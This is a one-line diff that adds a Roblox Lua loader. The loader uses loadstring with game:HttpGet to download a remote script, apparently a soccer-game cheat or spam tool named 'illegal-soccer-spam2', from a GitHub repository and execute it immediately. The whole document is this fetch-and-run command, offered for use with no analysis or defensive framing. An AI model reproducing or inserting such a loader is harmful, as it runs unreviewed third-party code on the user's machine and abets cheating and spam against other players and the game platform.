@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/illegal-soccer-spam2-ktwm8zwhocjuw8.lua"))()
